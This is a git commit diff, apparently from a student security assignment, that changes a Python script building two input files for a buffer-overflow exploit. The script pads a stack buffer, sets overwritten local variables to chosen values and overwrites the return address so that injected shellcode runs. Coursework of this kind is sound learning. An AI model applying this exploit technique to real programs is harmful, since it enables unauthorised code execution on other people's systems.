321b75f30e82e16d63697ad5d830744c91afeccf
Mandy Wang <shunflower320@gmail.com>
2020-10-19 02:11:28 +0800

    works outside gdb

--- 2/a2/buffer_overflow/script.py
+++ 2/a2/buffer_overflow/script.py
@@ -8,25 +8,43 @@ with open("exploit1", "wb+") as f1:
         f1.write(shell_code[i:i+1])
 
     f1.write(b'\xff'*(32-14)) # fill the rest of buf
-    f1.write(b'\xff'*8) # up to 104
+    f1.write(b'\xff'*8) # e340 - e347
+
     """
     hypothesis: attempting to overwrite byte_read1 resulted in idx < byte_read1 + byte_read2
     because of integer overflow (since they are both \xff*4).
     
-    try: not overflowing into them
+    try: assign both to be \x40
     """
+    f1.write(b'\x00'*2) # e350 - e351
 
-    # f1.write(b'\xff'*4) # filling 104 (idx)
-    # f1.write(b'\x80\xff\xff\x00') # 112
-    # f1.write(b'\x00\xff\xff\x00') # return addr
+    f1.write(b'\x38') # e354: byte_read2??
+    f1.write(b'\x00') # 3rd byte of int
+
+    f1.write(b'\x38')  # byte_read1
+    f1.write(b'\x00')  # 3rd byte of int
+
+    f1.write(b'\x5c') # e35c: idx
+    f1.write(b'\x00')
+
+    f1.write(b'\x80\xff\xff\x00') # 112
+    f1.write(b'\x90\xff\xff\x00') # return addr
 
 with open("exploit2", "wb+") as f2:
     for j in range (1, len(shell_code), 2):
         f2.write(shell_code[j:j+1])
 
     f2.write(b'\x00'*(32-13))
-    f2.write(b'\x00'*8)
-    # f2.write(b'\x00'*4) # idx
-    # f2.write(b'\xe3\xff\x7f\x00') # 112
-    # f2.write(b'\xe3\xff\x7f\x00') # return
+    f2.write(b'\x00'*8) # e348 - e34f
+
+    f2.write(b'\x00'*2) # e352 - e353
+
+    f2.write(b'\x00'*2) # e354: byte_read2
+
+    f2.write(b'\x00'* 2)  # byte_read1
+
+    f2.write(b'\x00' * 2)  # idx
+
+    f2.write(b'\xe3\xff\x7f\x00') # 112
+    f2.write(b'\xe3\xff\x7f\x00') # return
 
